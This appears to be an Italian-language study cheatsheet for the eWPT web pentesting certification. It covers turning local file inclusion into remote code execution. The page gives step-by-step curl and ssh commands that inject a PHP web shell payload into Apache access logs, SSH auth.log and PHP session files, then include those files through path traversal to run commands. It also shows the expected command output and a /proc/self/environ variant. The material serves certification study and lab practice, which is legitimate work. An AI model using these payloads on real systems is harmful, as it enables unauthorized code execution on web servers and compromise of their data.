---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "LFI Advanced"
permalink: "/cheatsheet/ewpt/03-file-inclusion/02-lfi-advanced/"
section: "File Inclusion"
section_order: 3
order: 2
sort_key: 302
---

**Difficoltà:** Advanced
**Time to Master:** 3h
**Prerequisiti:** [01-LFI-Basics.md](/cheatsheet/ewpt/03-file-inclusion/01-lfi-basics/)
**Lab:** HTB (macchine con LFI-to-RCE)

---

## Obiettivo

Una LFI che legge solo `/etc/passwd` è un mezzo risultato: il salto vero è trasformarla in esecuzione di codice, e il log poisoning è la tecnica più usata per farlo. L'idea è più semplice di quanto sembri la prima volta che la vedi: se riesci a far scrivere del codice PHP dentro un file che il server logga già (uno header, un tentativo di login), e poi includi quel file con la LFI, il server esegue quello che ci hai messo. È uno dei chain d'attacco più richiesti nell'esame eWPT, quindi vale la pena farlo diventare un riflesso.

---

## Concetti chiave

### Log Poisoning

Se riesci a scrivere codice PHP in un file che il server logga (access log, error log, SSH auth log) e poi includerlo via LFI, il codice viene eseguito.

| File di log | Come avvelenarlo |
|-------------|-------------------|
| Apache access.log | User-Agent con payload PHP |
| Apache error.log | richiesta a path inesistente con payload nell'URL |
| SSH auth.log | tentativo di login con username = payload PHP |

### Session Poisoning (PHP)

I file di sessione PHP (`/var/lib/php/sessions/sess_<id>`) contengono dati controllati dall'utente: se il nome del file è prevedibile (basato sul cookie `PHPSESSID`), puoi avvelenarli e poi includerli.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| curl | User-Agent custom | avvelena log | primo step del poisoning |
| Burp Repeater | modifica header/cookie | conferma poisoning | verifica prima di includere |

---

## Payload / Esempi

### Esempio 1: log poisoning via User-Agent + Apache access.log

**Setup:**
- Target: app PHP con LFI confermata, Apache access.log leggibile via LFI
- Vulnerability: LFI + log scrivibile con dati controllati dall'utente

**Step-by-step:**
```bash
# Step 1: inietta payload PHP nel log tramite User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: includi il log via LFI e passa il comando
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
```

**Output atteso:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Spiegazione:** il server interpreta il log incluso come codice PHP, quindi la funzione `system()` iniettata nel campo User-Agent viene eseguita quando il file viene incluso.

### Esempio 2: log poisoning via SSH

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# genera una entry in /var/log/auth.log con il payload
curl "http://target.com/index.php?page=../../../../var/log/auth.log&cmd=id"
```

**Spiegazione:** funziona solo se `/var/log/auth.log` è leggibile dall'utente web (spesso richiede privilegi elevati, ma vale la pena testare).

### Esempio 3: PHP session poisoning

```bash
# Step 1: scopri path sessioni e il tuo PHPSESSID (dal cookie)
curl -c cookies.txt http://target.com/

# Step 2: inietta payload PHP in un campo che finisce nella sessione (es. campo "lingua")
curl -b cookies.txt "http://target.com/set_lang.php?lang=<?php system(\$_GET['cmd']); ?>"

# Step 3: includi il file di sessione via LFI
curl -b cookies.txt "http://target.com/index.php?page=../../../../var/lib/php/sessions/sess_SESSIONID&cmd=id"
```

---

## Evasion / Bypass Techniques

### Bypass filtro estensione con path troncato

Se l'app forza `.php` in append e c'è un limite di lunghezza path in PHP < 5.3 (raro), un path molto lungo può troncare l'estensione forzata.

### Uso di /proc/self/environ (legacy, raro oggi)

```
?page=../../../../proc/self/environ
```
Con User-Agent avvelenato allo stesso modo del log poisoning, se `environ` è leggibile.

---

## Lab Hands-On

### Lab 1: HTB (LFI to RCE via log poisoning)
**Obiettivo:** ottenere RCE partendo da una LFI confermata
**Difficulty:** Difficile
**Time:** 1.5h

**Walkthrough breve:**
1. Conferma LFI e trova il path del log accessibile
2. Avvelena il log con payload PHP
3. Includi il log passando comandi via parametro GET

---

## Common Mistakes

- Dimenticare che il log deve essere leggibile dal processo web -> verifica sempre i permessi prima di dare per scontato il fallimento
- Non URL-encodare correttamente il payload PHP nello User-Agent -> usa `--data-urlencode` o Burp per evitare corruzione della sintassi

---

## Link Utili

- [HackTricks: LFI to RCE](https://book.hacktricks.xyz/)
- [OWASP Testing Guide: LFI](https://owasp.org/www-project-web-security-testing-guide/)

---

## Connessioni

- **Prerequisito:** [01-LFI-Basics.md](/cheatsheet/ewpt/03-file-inclusion/01-lfi-basics/)
- **Prossimo Step:** [03-RFI-Techniques.md](/cheatsheet/ewpt/03-file-inclusion/03-rfi-techniques/)
- **Combinazione con:** [08-Exploitation-PostEx/03-Reverse-Shells.md](/cheatsheet/ewpt/08-exploitation-postex/03-reverse-shells/)

---

## Checklist di padronanza

- [ ] So identificare log leggibili via LFI
- [ ] So eseguire log poisoning via User-Agent
- [ ] So collegare LFI a RCE end-to-end
- [ ] Ho provato session poisoning almeno una volta
